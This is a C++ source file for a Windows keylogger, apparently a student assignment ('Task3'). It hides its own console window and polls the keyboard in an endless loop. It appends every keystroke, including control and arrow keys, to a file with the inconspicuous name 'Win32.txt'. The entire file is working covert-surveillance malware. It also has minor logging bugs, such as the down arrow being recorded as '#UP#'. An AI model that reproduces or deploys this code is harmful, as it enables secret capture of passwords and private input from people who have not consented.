//============================================================================
// Name        : Keylogger_Task3.cpp
// Author      : Grigoris Kokozides
// Version     : 1.0.0
// Copyright   : Your copyright notice
// Description : Keylogger, the virtual keys found in https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx

//============================================================================
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

//function that open a new text file named Win32 and stores a sequence of strings
void LOG(string input) {

	fstream LogFile;

	LogFile.open("Win32.txt", fstream::app);

	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}
//This function is for the special Keys in the keyboard.
bool SpecialKeys(int S_Key) {

	switch (S_Key) {

	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;

	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;

	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT# ");
		return true;

	case VK_BACK:
		cout << " ";
		LOG(" ");
		return true;

	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK# ");
		return true;

	case VK_TAB:
		cout << "\t";
		LOG("\t");
		return true;

	case VK_CONTROL:
		cout <<"#CONTROL#";
		LOG("#CONTROL# ");
		return true;

	case VK_END:
		cout <<"#END#";
		LOG("#END# ");
		return true;

	case VK_HOME:
		cout <<"#HOME#";
		LOG("#HOME# ");
		return true;

	case VK_LEFT:
		cout <<"#LEFT#";
		LOG("#LEFT# ");
		return true;

	case VK_RIGHT:
		cout <<"#RIGHT#";
		LOG("#RIGHT# ");
		return true;

	case VK_UP:
		cout <<"#UP#";
		LOG("#UP# ");
		return true;

	case VK_DOWN:
		cout <<"#DOWN#";
		LOG("#UP# ");
		return true;

	case VK_ESCAPE:
		cout <<"#ESCAPE#";
		LOG("#ESCAPE# ");
		return true;

	case VK_CAPITAL:
		cout <<"#CAPITAL#";
		LOG("#CAPITAL#");
		return true;

	case VK_MENU:
		cout <<"#ALT#";
		LOG("#ALT#");
		return true;

	case VK_SNAPSHOT:
		cout <<"#ScreenShot#";
		LOG("#ScreenShot#");
		return true;

	case VK_OEM_COMMA:
		cout <<",";
		LOG(",");
		return true;

	case VK_OEM_PERIOD:
		cout <<".";
		LOG(".");
		return true;

	case VK_OEM_2:
		cout <<"?";
		LOG("?");
		return true;

	case VK_OEM_4:
		cout <<"[{";
		LOG("[{");
		return true;

	case VK_OEM_6:
		cout <<"]}";
		LOG("]}");
		return true;


	default:
		return false;
	}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';
	while (true) { //stops when user decides it!
		Sleep(10);
		for (KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					fstream LogFile;

					LogFile.open("Win32.txt", fstream::app);

					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}
				}
			}
		}
	}
	return 0;
}
